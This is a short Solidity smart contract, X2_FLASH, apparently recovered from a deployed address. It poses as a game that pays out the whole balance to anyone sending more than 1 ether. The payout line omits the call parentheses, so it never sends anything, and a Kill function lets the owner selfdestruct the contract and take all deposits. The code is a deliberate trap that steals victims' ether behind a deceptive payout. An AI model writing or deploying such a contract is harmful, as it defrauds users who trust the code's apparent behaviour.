/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract X2_FLASH at 0x2F30fF3428D62748A1d993F2Cc6C9B55dF40B4d7
*/
pragma solidity ^0.4.19;

contract X2_FLASH  
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}